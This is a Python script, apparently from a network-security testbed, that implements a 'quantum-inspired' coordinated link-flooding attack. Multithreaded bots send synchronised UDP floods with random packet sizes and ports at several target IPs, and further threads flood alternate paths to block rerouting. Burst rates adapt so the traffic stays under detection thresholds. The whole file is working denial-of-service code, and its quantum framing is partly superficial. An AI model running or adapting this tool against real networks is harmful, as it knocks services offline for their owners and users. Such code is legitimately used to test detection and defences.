#!/usr/bin/env python3
"""
=============================================================================
ATTACK F: Quantum-Inspired Coordinated LFA
=============================================================================
The most sophisticated LFA variant, inspired by quantum computing principles:
  - Superposition: Multiple attack vectors active simultaneously
  - Entanglement: Bots are synchronized via a shared quantum-like state
  - Interference: Constructive/destructive patterns to amplify congestion
  - Probabilistic target selection: Target selection based on Grover-like search
  - Adaptive path switching: Dynamically switches attack paths to maximise impact

This is NOT actual quantum computing — it's a classical attack that
borrows quantum-inspired algorithms for improved coordination:
  1. Simulated annealing for adaptive target selection
  2. Quantum random walk for path exploration
  3. Interference patterns for synchronized burst timing
  4. Multi-path congestion via superposition of simultaneous flows

Why this is the most advanced LFA:
  - Traditional detection uses per-flow or aggregate metrics
  - Quantum-inspired LFA spreads load across many paths simultaneously
  - Synchronized bots create constructive interference at bottleneck
  - Adaptive learning avoids detection thresholds in real-time

Usage:
    python3 attacks/quantum_inspired_lfa.py \
        --targets 10.0.0.2,10.1.0.2,10.2.0.2 \
        --bottleneck 10.2.0.2 \
        --num-bots 12 \
        --duration 180
=============================================================================
"""

import time
import math
import random
import socket
import struct
import threading
import argparse
import logging
import heapq
import numpy as np
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [QUANTUM-LFA] %(message)s'
)
LOG = logging.getLogger('QuantumLFA')


# =============================================================================
# Quantum-Inspired Algorithms
# =============================================================================

class QuantumRandomWalk:
    """
    Simulates a quantum random walk over network path space.
    Classical random walk: position drifts as O(√t)
    Quantum random walk: spreads as O(t) — faster exploration

    Used to discover and exploit all available bottleneck paths.
    """

    def __init__(self, num_paths: int):
        self.num_paths = num_paths
        # Initialize quantum state as superposition over all paths
        self.amplitudes = np.ones(num_paths, dtype=complex) / math.sqrt(num_paths)

    def _hadamard_coin(self) -> np.ndarray:
        """Apply Hadamard coin operator (quantum "coin flip")."""
        H = np.array([[1, 1], [1, -1]], dtype=complex) / math.sqrt(2)
        return H

    def step(self) -> np.ndarray:
        """
        Execute one step of the quantum random walk.
        Returns probability distribution over paths.
        """
        # Shift operator: move left/right based on coin state
        n = self.num_paths
        shift_right = np.roll(np.eye(n, dtype=complex), 1, axis=0)
        shift_left  = np.roll(np.eye(n, dtype=complex), -1, axis=0)

        # Coin operation on each position
        for i in range(n):
            amp = self.amplitudes[i]
            # Hadamard on |0> component
            self.amplitudes[i] = (amp + self.amplitudes[(i + 1) % n]) / math.sqrt(2)

        # Normalize
        norm = np.linalg.norm(self.amplitudes)
        if norm > 0:
            self.amplitudes /= norm

        # Return probability distribution (|amplitude|^2)
        return np.abs(self.amplitudes) ** 2

    def sample_path(self) -> int:
        """Sample a path index according to quantum probability distribution."""
        probs = self.step()
        return np.random.choice(self.num_paths, p=probs / probs.sum())


class GroverTargetSelector:
    """
    Grover-inspired target selection algorithm.
    Classical Grover's algorithm finds a target in O(√N) queries.
    Here we use amplitude amplification to focus on high-value targets.
    """

    def __init__(self, targets: List[str], link_utilizations: Dict[str, float]):
        self.targets       = targets
        self.utilizations  = link_utilizations
        n = len(targets)
        # Initialize uniform superposition
        self.amplitudes = np.ones(n, dtype=complex) / math.sqrt(n)

    def oracle(self, target_idx: int) -> np.ndarray:
        """
        Phase oracle: flip sign of high-utilization targets.
        (These are the most valuable targets to amplify congestion on)
        """
        result = self.amplitudes.copy()
        for i, target in enumerate(self.targets):
            util = self.utilizations.get(target, 0.5)
            if util > 0.7:   # "marked" item = high utilization target
                result[i] *= -1
        return result

    def diffusion(self, state: np.ndarray) -> np.ndarray:
        """Grover diffusion operator: inversion about average."""
        mean = np.mean(state)
        return 2 * mean - state

    def select_target(self, num_iterations: int = 3) -> str:
        """Run Grover iterations and return the selected target."""
        state = self.amplitudes.copy()
        for _ in range(num_iterations):
            state = self.oracle(0)
            state = self.diffusion(state)

        probs = np.abs(state) ** 2
        probs /= probs.sum()
        idx = np.random.choice(len(self.targets), p=probs)
        return self.targets[idx]


class InterferenceTimingController:
    """
    Controls synchronized burst timing using constructive interference.

    Bots are arranged in "phases" such that their bursts arrive at the
    bottleneck simultaneously (constructive interference = amplified congestion)
    while their traffic appears distributed in time at their source
    (destructive interference = evades per-source detection).
    """

    def __init__(self, num_bots: int, bottleneck_latency_ms: float = 5.0):
        self.num_bots             = num_bots
        self.bottleneck_latency   = bottleneck_latency_ms / 1000.0
        # Phase offsets: bots send at different times so bursts arrive simultaneously
        self.phase_offsets = self._compute_phases()

    def _compute_phases(self) -> List[float]:
        """
        Compute per-bot send time offsets such that all bursts
        arrive at bottleneck at the same time.

        offset_i = -latency_i (sends early to compensate for propagation delay)
        In simulation: stagger sends by latency_variance / (num_bots - 1)
        """
        latency_variance = 0.002   # 2ms variance across bots
        offsets = []
        for i in range(self.num_bots):
            # Negative offset: bot i sends (offset_i) seconds BEFORE the sync point
            offset = -latency_variance * (i / max(1, self.num_bots - 1))
            offsets.append(offset)
        return offsets

    def get_phase_offset(self, bot_id: int) -> float:
        """Return the phase offset for a given bot."""
        return self.phase_offsets[bot_id % self.num_bots]

    def next_sync_time(self, cycle_period: float = 1.0) -> float:
        """Return the next global synchronization point."""
        now   = time.time()
        cycle = int(now / cycle_period)
        return (cycle + 1) * cycle_period


@dataclass
class BotState:
    """Mutable state for a single quantum bot."""
    bot_id        : int
    current_target: str
    packets_sent  : int = 0
    bytes_sent    : int = 0
    path_history  : List[str] = field(default_factory=list)
    is_active     : bool = True


class QuantumBot:
    """
    A single adaptive bot in the quantum-inspired coordinated LFA.
    Uses quantum random walk for path selection and Grover for target selection.
    """

    def __init__(self, bot_id: int, targets: List[str],
                 timing: InterferenceTimingController, duration: int,
                 shared_state: Dict):
        self.bot_id       = bot_id
        self.targets      = targets
        self.timing       = timing
        self.duration     = duration
        self.shared_state = shared_state   # shared across all bots
        self.state        = BotState(bot_id=bot_id, current_target=random.choice(targets))
        self.walk         = QuantumRandomWalk(len(targets))
        self.running      = False

    def _select_next_target(self) -> str:
        """Use quantum random walk to select next attack target."""
        path_idx = self.walk.sample_path()
        return self.targets[path_idx % len(self.targets)]

    def _send_burst(self, target_ip: str, burst_pps: int, burst_dur: float):
        """Send a burst of attack packets."""
        sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        interval = 1.0 / burst_pps
        end_time = time.time() + burst_dur
        sent     = 0

        while time.time() < end_time and self.running:
            # Variable size packet to evade signature detection
            sz      = random.choice([64, 128, 256, 512, 1024, 1400])
            payload = random.randbytes(sz)
            port    = random.randint(1024, 65535)
            try:
                sock.sendto(payload, (target_ip, port))
                sent += 1
            except socket.error:
                pass
            time.sleep(interval)

        sock.close()
        self.state.packets_sent += sent
        self.state.bytes_sent   += sent * 512   # approximate

    def run(self):
        """Run the quantum bot for the attack duration."""
        self.running = True
        phase_offset = self.timing.get_phase_offset(self.bot_id)

        LOG.debug('[Bot-%02d] Starting with phase offset=%.3fs', self.bot_id, phase_offset)
        start = time.time()

        while self.running and (time.time() - start) < self.duration:
            # Select target using quantum walk
            target = self._select_next_target()
            self.state.current_target = target
            self.state.path_history.append(target)

            # Wait for synchronized burst window (adjusted for phase offset)
            next_sync = self.timing.next_sync_time(cycle_period=2.0)
            wait_time = next_sync - time.time() + phase_offset
            if wait_time > 0:
                time.sleep(wait_time)

            # Adaptive burst rate based on shared congestion state
            congestion = self.shared_state.get(target, 0.0)
            burst_pps  = int(2000 * (1.0 - congestion * 0.5))  # back off if detected
            burst_pps  = max(500, burst_pps)

            # Execute synchronized burst
            LOG.debug('[Bot-%02d] Burst → %s at %d pps', self.bot_id, target, burst_pps)
            self._send_burst(target, burst_pps, burst_dur=0.8)

            # Update shared state (simulate feedback from network telemetry)
            self.shared_state[target] = min(1.0,
                self.shared_state.get(target, 0.0) + 0.05)

        LOG.info('[Bot-%02d] Done: %d pkts, %.1f MB, %d paths used',
                 self.bot_id, self.state.packets_sent,
                 self.state.bytes_sent / 1e6, len(set(self.state.path_history)))

    def stop(self):
        self.running = False


class MultiPathCongestion:
    """
    Simultaneously congests multiple network paths to prevent
    traffic from being rerouted away from the congested bottleneck.
    """

    def __init__(self, paths: List[Tuple[str, int]], duration: int):
        """
        Args:
            paths: List of (ip, port) tuples representing different paths
            duration: Attack duration in seconds
        """
        self.paths    = paths
        self.duration = duration
        self.threads  = []
        self.running  = False

    def _congest_path(self, ip: str, port: int):
        """Continuously flood a single path."""
        sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start    = time.time()
        interval = 1.0 / 1000   # 1000 pps per path

        while self.running and (time.time() - start) < self.duration:
            try:
                sock.sendto(random.randbytes(256), (ip, port))
            except socket.error:
                pass
            time.sleep(interval)

        sock.close()

    def run(self):
        self.running = True
        LOG.info('Multi-path congestion: flooding %d simultaneous paths', len(self.paths))

        self.threads = [
            threading.Thread(target=self._congest_path, args=(ip, port), daemon=True)
            for ip, port in self.paths
        ]
        for t in self.threads:
            t.start()
        for t in self.threads:
            t.join(timeout=self.duration + 5)
        LOG.info('Multi-path congestion done.')

    def stop(self):
        self.running = False


class QuantumInspiredCoordinatedLFA:
    """
    Master orchestrator for the Quantum-Inspired Coordinated LFA.

    Combines:
    - Quantum random walk for path exploration
    - Grover-inspired target selection
    - Constructive interference timing
    - Multi-path simultaneous congestion
    - Adaptive bot coordination via shared state
    """

    def __init__(self, targets: List[str], bottleneck_ip: str,
                 num_bots: int, duration: int):
        self.targets       = targets
        self.bottleneck_ip = bottleneck_ip
        self.num_bots      = num_bots
        self.duration      = duration
        self.shared_state  = defaultdict(float)  # {target_ip: congestion_level}

        self.timing = InterferenceTimingController(num_bots)
        self.bots   = [
            QuantumBot(i, targets, self.timing, duration, self.shared_state)
            for i in range(num_bots)
        ]

    def run(self):
        LOG.info('╔══════════════════════════════════════════════════╗')
        LOG.info('║   Quantum-Inspired Coordinated LFA               ║')
        LOG.info('╚══════════════════════════════════════════════════╝')
        LOG.info('  Targets        : %s', ', '.join(self.targets))
        LOG.info('  Bottleneck     : %s', self.bottleneck_ip)
        LOG.info('  Bots           : %d', self.num_bots)
        LOG.info('  Duration       : %ds', self.duration)
        LOG.info('  Quantum tricks : random walk + Grover selection + interference')

        # Phase 1: Multi-path congestion (block rerouting)
        alt_paths = [(t, random.randint(8000, 9000)) for t in self.targets]
        mp_congestion = MultiPathCongestion(alt_paths, self.duration)
        mp_thread     = threading.Thread(target=mp_congestion.run, daemon=True)
        mp_thread.start()

        # Phase 2: Launch quantum bots
        bot_threads = [threading.Thread(target=b.run, daemon=True)
                       for b in self.bots]
        for t in bot_threads:
            t.start()

        # Phase 3: Adaptive monitoring & dynamic path switching
        monitor_thread = threading.Thread(
            target=self._adaptive_monitor, daemon=True)
        monitor_thread.start()

        # Wait
        LOG.info('All components running. Attack in progress...')
        try:
            time.sleep(self.duration + 5)
        except KeyboardInterrupt:
            LOG.info('Attack interrupted')
            self._stop_all()

        for t in bot_threads:
            t.join(timeout=10)
        mp_thread.join(timeout=10)

        self._print_summary()

    def _adaptive_monitor(self):
        """Monitor attack progress and adjust based on shared state."""
        start = time.time()
        while time.time() - start < self.duration:
            time.sleep(10)
            LOG.info('[MONITOR] Shared congestion state: %s',
                     {k: f'{v:.2f}' for k, v in self.shared_state.items()})

            # If one target's congestion drops, amplify attack there
            min_target = min(self.shared_state, key=self.shared_state.get,
                             default=self.targets[0])
            LOG.info('[MONITOR] Focusing on least-congested: %s', min_target)

    def _stop_all(self):
        for bot in self.bots:
            bot.stop()

    def _print_summary(self):
        total_pkts  = sum(b.state.packets_sent for b in self.bots)
        total_bytes = sum(b.state.bytes_sent   for b in self.bots)
        LOG.info('=' * 55)
        LOG.info('QUANTUM LFA SUMMARY')
        LOG.info('  Total packets : %d', total_pkts)
        LOG.info('  Total data    : %.1f MB', total_bytes / 1e6)
        LOG.info('  Active bots   : %d', self.num_bots)
        LOG.info('  Paths explored: %d', len(set(
            p for b in self.bots for p in b.state.path_history)))
        LOG.info('=' * 55)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Quantum-Inspired Coordinated LFA')
    parser.add_argument('--targets',    default='10.0.0.2,10.1.0.2,10.2.0.2',
                        help='Comma-separated target IPs')
    parser.add_argument('--bottleneck', default='10.2.0.2',
                        help='Primary bottleneck IP')
    parser.add_argument('--num-bots',   type=int, default=12, help='Number of bots')
    parser.add_argument('--duration',   type=int, default=180, help='Duration (s)')
    args = parser.parse_args()

    targets = [t.strip() for t in args.targets.split(',')]
    attack  = QuantumInspiredCoordinatedLFA(
        targets       = targets,
        bottleneck_ip = args.bottleneck,
        num_bots      = args.num_bots,
        duration      = args.duration
    )
    attack.run()
